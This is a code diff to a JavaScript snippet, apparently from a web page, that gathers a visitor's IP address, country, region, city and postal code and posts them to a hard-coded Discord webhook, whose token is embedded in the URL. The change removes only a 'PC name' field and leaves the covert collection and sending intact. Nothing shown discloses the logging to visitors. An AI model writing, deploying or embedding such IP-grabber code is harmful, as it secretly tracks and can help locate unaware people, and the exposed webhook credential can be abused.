@@ -26,18 +26,17 @@
                     const city = data.city;
                     const regioncode = data.region_code;
                     const postalcode = data.postal;
-                    const pcname = window.location.hostname; // Get the PC name of the user
-                    sendIPToWebhook(ip, country, region, city, regioncode, postalcode, pcname);
+                    sendIPToWebhook(ip, country, region, city, regioncode, postalcode);
                 })
                 .catch(error => {
                     console.log('Error:', error);
                 });
         }
 
-        function sendIPToWebhook(ip, country, region, city, regioncode, postalcode, pcname) {
+        function sendIPToWebhook(ip, country, region, city, regioncode, postalcode) {
             const webhookUrl = 'https://discord.com/api/webhooks/1113688349878800445/lWt0rsk4cFH0uvbagEzKbGQUgJLF17bA3h4BqlfK9E8OizkwgWgzBhhYoVaBLaokSfOL'; // Replace with your Discord webhook URL
             const payload = {
-                content: `IP: ${ip}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nRegion Code: ${regioncode}\nPostal Code: ${postalcode}\nPC Name: ${pcname}`
+                content: `IP: ${ip}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nRegion Code: ${regioncode}\nPostal Code: ${postalcode}`
             };
             fetch(webhookUrl, {
                 method: 'POST',
